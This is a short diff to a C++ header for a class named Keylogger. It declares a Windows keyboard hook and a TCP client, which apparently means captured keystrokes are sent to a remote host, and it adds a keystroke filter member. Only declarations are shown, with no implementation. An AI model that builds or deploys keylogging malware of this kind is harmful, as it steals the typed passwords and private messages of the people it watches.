@@ -5,6 +5,7 @@
 #include <string>
 #include <vector>
 #include "TcpClient.h"
+#include "Filters.h"
 
 #ifndef UNICODE
 #define UNICODE
@@ -13,11 +14,12 @@
 class Keylogger
 {
 public:
-	BOOLEAN TrySetHook();
-	Keylogger(TcpClient client);
+	BOOLEAN SetHook();
+	Keylogger(TcpClient client, Filters filters);
 	~Keylogger();
 
 private:
+	static Filters *filters;
 	static TcpClient* client;
 	static HHOOK hHook;
 	static LRESULT CALLBACK KeyboardProc(IN int code, IN WPARAM wParam, IN LPARAM lParam);
